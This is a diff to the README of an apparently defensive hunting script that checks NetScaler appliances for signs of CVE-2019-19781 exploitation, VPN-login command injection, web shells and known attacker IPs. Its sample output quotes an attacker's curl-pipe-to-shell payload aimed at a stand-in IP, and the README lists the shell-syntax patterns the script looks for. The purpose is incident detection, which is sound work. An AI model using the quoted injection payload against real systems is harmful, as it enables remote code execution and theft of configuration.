@@ -49,7 +49,7 @@ Each finding is labelled:
 Example:
 
 ```
-NetScaler quick hunt 1.1 - ns01 - 2026-09-30 14:43
+NetScaler quick hunt 1.2 - ns01 - 2026-09-30 14:43
 
 [HIGH] CVE-2019-19781 exploit files: this box was exploited (Jan 2020 wave)
        Jan 11 2020 16:04  /var/vpn/bookmark/pwnpzi1337.xml  (exploit file name)
@@ -59,11 +59,12 @@ NetScaler quick hunt 1.1 - ns01 - 2026-09-30 14:43
          tried: pitboss PPE unexpectedly died NSPPE;U=http://203.0.113.10:8899/s;curl${IFS}$U|sh;# X
        Files the attacks tried to create:
          not present now (never created, or removed since): /var/netscaler/logon/LogonPoint/x.html
+           web requests for /logon/LogonPoint/x.html: status 404 x12
        Check firewall logs for connections from the NetScaler to:
          http://203.0.113.10:8899/s
 
 RESULT: 1 HIGH, 1 ATTACK, 0 CHECK.
-Scanned: 24 bookmark files in /var/vpn/bookmark, 26 ns.log files, 5 httpaccess.log files (0 unreadable).
+Scanned: 24 bookmark files in /var/vpn/bookmark, 26 ns.log files, 5 web access log files (0 unreadable).
 Log checks only see logs still on the box (back to Sep 29); older attacks need your syslog server.
 ```
 
@@ -84,12 +85,15 @@ If a check crashes, it is reported as `[SKIPPED]` and the remaining checks still
    Bookmarks last modified during the January 2020 mass-exploitation wave are
    `CHECK`, labelled as empty stub or real bookmarks, because the date alone is
    not proof. Files owned by `nobody` in `/netscaler/portal/templates` are `HIGH`.
-2. **Command injection through the VPN login** - failed logins in `ns.log*`
-   whose user name contains shell syntax (`` ` ``, `${IFS}`, `$(`, `| sh`,
-   `pitboss`). Summarised per attacker IP with the number of attempts, time
-   range and payload. For files the payload tried to create in a web folder it
-   reports whether they exist now (`HIGH` if so), and it lists download URLs to
-   look for in your firewall logs.
+2. **Command injection through the VPN login** - failed logins and
+   authentication requests in `ns.log*` whose user name contains shell syntax
+   (`` ` ``, `${IFS}`, `$(`, `| sh`, `pitboss`). Summarised per attacker IP with
+   the number of attempts, time range and payload, plus everything those IPs
+   requested from the web server (status codes and successful URLs). For files the payload tried to create in a web folder it
+   reports whether they exist now (`HIGH` if so) and how the web server answered
+   requests for them. A successful (`2xx`) download is `HIGH` - for example an
+   attack that packs `/flash/nsconfig` into a file in the login page and then
+   downloads it. It also lists download URLs to look for in your firewall logs.
 3. **Path-traversal probes carrying commands** - requests the NetScaler logged
    and blocked as `Path traversal detected` that contained `curl`, `wget` or
    command separators, per source IP.
@@ -122,19 +126,20 @@ If a check crashes, it is reported as `[SKIPPED]` and the remaining checks still
     setuid/setgid bit, which gives web shells root.
 15. **SLAPSHOT tunnel** - `/tmp/.uxdport`, `/tmp/.uxdlock` and running Python
     processes that execute base64 payloads.
-16. **Web access log** (`httpaccess.log*`) - requests for `<hex>.ico` / `.sig`
+16. **Web access logs** (`httpaccess*.log*`, including the Gateway's `httpaccess-vpn.log`) - requests for `<hex>.ico` / `.sig`
     web shell URLs, and `INDEX:<base64>` or base64-only User-Agents, shown
     decoded.
 17. **Crash dumps** from the last 14 days in `/var/core` and `/var/crash` - failed
     exploits can crash the packet engine (NSPPE).
 18. **Known attacker IP addresses** published by Mandiant, GreyNoise and
-    Lupovis, in `ns.log*` and `httpaccess.log*`, and in current connections.
+    Lupovis, in `ns.log*` and the web access logs, and in current connections.
 
 ## Limitations
 
 - **Logs rotate quickly.** The log checks only see the `ns.log*` and
-  `httpaccess.log*` files still on the appliance, often just a day or two. Search your syslog server or SIEM for
-  older attacks; the script prints how far back the local logs go.
+  `httpaccess*.log*` files still on the appliance, often just a day or two.
+  Search your syslog server or SIEM for older attacks; the script prints how far
+  back the local logs go.
 - **A missing file does not prove an attack failed** - the attacker may have
   removed it. The script says "not present now", not "failed".
 - **File dates are modification times.** They can be changed and do not show
